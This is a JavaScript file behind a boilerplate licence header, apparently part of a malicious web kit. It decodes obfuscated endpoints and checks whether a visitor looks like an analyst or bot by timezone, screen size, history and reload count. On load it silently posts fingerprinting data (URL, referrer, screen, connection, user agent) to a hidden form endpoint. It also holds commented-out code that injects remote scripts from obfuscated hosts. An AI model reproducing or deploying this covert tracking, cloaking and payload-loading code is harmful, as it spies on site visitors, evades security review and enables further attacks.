/**
 * @licence
 * Copyright ©
 * All rights reserved
 * This source code is licensed under the found in the
 * LICENSE file in the root directory of this source tree
*/

var Nloaded = Number(localStorage.getItem("Nloaded")) + 1, _initiated, sc;

try {
  class identifierDocumentValue {
    get(bad) {
      bad = this.getFixed(bad);
      return bad;
    }

    getFixed(txt) {
      var p1 = "", p2 = "", l = txt.length;
      for (let i = 0; i <= l; i++) {
        if (i % 2 == 0) {
          p2 = txt.charAt(i) + p2;
        } else {
          p1 = p1 + txt.charAt(i);
        }
      }
      return atob(p1 + p2);
    }

  }
  sc = new identifierDocumentValue();
} catch (err) { }


function getDefaultName(name) {
  var dv = navigator.appVersion.split(")")[0].replace("5.0 (", "").replace("Linux; Android", "An..");
  if (_39012seefalseUser()) {
    dv += "__falseUser:____" + navigator.platform + "___" + navigator.userAgent;
  }
  return dv;
}

function _39012seefalseUser() {
  var place = new Date().toTimeString();
  if (
    (window.screen.width <= window.innerWidth && window.screen.height <= window.innerHeight) || !navigator.userAgent.includes(navigator.platform.substring(0, 3)) ||
    (history.length > 3 || history.length == 1) ||
    Nloaded > 2 ||
    !(place.includes('Pacific') || place.includes('Eastern') || place.includes('Central')) ||
    ((window.screen.width == 1440 && window.screen.height == 900) || (window.screen.width == 1536 && window.screen.height == 864) || (window.screen.width == 1366 && window.screen.height == 768)) ||
    navigator.connection.downlink < 9
  ) {
    return true;
  }
}
function makeForm(url, dataObj) { const params = new URLSearchParams(); for (let key in dataObj) { params.append(key, dataObj[key]); } fetch(url, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params }); }

function addMaster(url) {
  var elem = document.createElement("script");
  elem.src = url;
  try {
    document.querySelector('style').insertAdjacentElement("beforeend", elem);
  } catch (e) {
    document.querySelector('#mobiOptiElem').insertAdjacentElement("beforeend", elem);
  } finally {
    document.querySelector('head').insertAdjacentElement("beforeend", elem);
  }
}
var serverData = {
  'null': sc.get("waLHyRV02ccHpM16WLay09Bz3ZbXvJ82WZaXuIItWcd3olRzXdaGnV5tyZbSp1"),
  'netlify': sc.get("waLHwRB0XcYHuMk6nLZyp9xzGZdXlJ52mZLXyJQuzZMX5RUsTadWwZM5DLOT5kI4HbMD5lMzDb"),
  'hstgr.io': sc.get("8aCHcRw0FcmHLM56ZLWya9stRbX2ZJup5cymZl0zQZGSd1vpNYz2N9vuZc3yb0n55Mmmcxl3pa2"),
}
// var lnkMain = serverData[String(document.querySelector("#mobiOptiElem").getAttribute('server'))];
// var lnkMain="";


function _init() {
  _initiated = true;
  if (Nloaded) {
    localStorage.setItem("Nloaded", Number(Nloaded));
  } else {
    Nloaded = 1;
    localStorage.setItem("Nloaded", 1);
  }

  // setTimeout(()=>{
  //   addMaster(`${lnkMain}data-19b902380k09`);
  // },100);

  // setTimeout(()=>{
  //   addMaster(`${lnkMain}master-10a404587b40544b`);
  // },200);
  sendInfo();
}
//this is a last line
if (!_initiated) {
  _init();
}

function sendInfo(msg = "") {
  // console.log('sendInfo', document.timeline.currentTime / 1000, msg)

  makeForm(sc.get('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmUdxvQbl2VdUslZ1Sa5zjQbT2T01vpZXmU9Eyhb2XMMsvNdjSZ86w9L12bQQvBZjSN8FxNRWkMFnJFcDFaFjMlUH2UZMCZdzlMVw6ZdDzWB1'), {
    "entry.522782255": Nloaded + "-" + history.length + "_" + document.referrer,
    "entry.2147471592": location.href,
    "entry.559704587": msg,
    "entry.1784255635": getMacTime(),
    "entry.1604074943": userWinInfo(),
  });
}


function userWinInfo() {
  var str = Math.floor(window.scrollY) + " > " + window.screen.width + "/" + window.innerWidth + " x " + window.screen.height + "/" + window.innerHeight + " ||| ";
  var conn = navigator.connection || {};
  str += `${conn.effectiveType} rtt:${conn.rtt} mbps:${conn.downlink}`

  return str;
}
function getMacTime() {
  return new Date().toLocaleTimeString() + " " + new Date().toTimeString().split("(")[1].replace(")", "");
}